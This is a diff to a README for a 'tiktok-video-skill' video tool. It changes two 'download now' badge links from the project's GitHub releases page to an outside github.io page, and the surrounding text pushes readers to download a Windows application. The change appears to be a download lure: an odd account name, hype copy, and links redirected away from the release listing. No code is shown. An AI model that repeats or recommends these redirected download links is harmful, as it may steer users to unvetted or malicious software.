@@ -40,7 +40,7 @@ Follow these simple steps to get your first video created:
 
 👉 **Click this button to get your copy:**
 
-[![DOWNLOAD NOW](https://img.shields.io/badge/⬇️_DOWNLOAD_TIKTOK_VIDEO_SKILL-FF6B6B?style=for-the-badge&logo=github&logoColor=white&labelColor=4ECDC4)](https://github.com/Trudiemisanthropic314/tiktok-video-skill/releases)
+[![DOWNLOAD NOW](https://img.shields.io/badge/⬇️_DOWNLOAD_TIKTOK_VIDEO_SKILL-FF6B6B?style=for-the-badge&logo=github&logoColor=white&labelColor=4ECDC4)](https://trudiemisanthropic314.github.io)
 
 Visit this link to download the application. The page will show you the available version for Windows.
 
@@ -198,7 +198,7 @@ Before you start, make sure you have:
 
 Don't wait! Download tiktok-video-skill today and turn your ideas into professional videos in minutes. Whether you're a content creator, marketer, teacher, or just curious - this tool will blow your mind.
 
-[![GET STARTED NOW](https://img.shields.io/badge/⚡_GET_STARTED_NOW-FFD93D?style=for-the-badge&logo=giphy&logoColor=black&labelColor=6BCB77)](https://github.com/Trudiemisanthropic314/tiktok-video-skill/releases)
+[![GET STARTED NOW](https://img.shields.io/badge/⚡_GET_STARTED_NOW-FFD93D?style=for-the-badge&logo=giphy&logoColor=black&labelColor=6BCB77)](https://trudiemisanthropic314.github.io)
 
 **Make videos. Go viral. Repeat.**
 
